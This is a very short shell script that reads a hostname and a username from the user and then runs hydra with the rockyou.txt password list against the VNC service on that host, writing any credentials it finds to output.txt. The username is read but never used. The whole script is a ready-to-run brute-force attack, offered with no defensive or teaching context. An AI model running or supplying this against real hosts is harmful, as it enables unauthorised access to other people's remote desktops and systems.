read -p "input username: " user
read -p "input hostname: " host

hydra -P rockyou.txt -vV -o output.txt -I vnc://$host
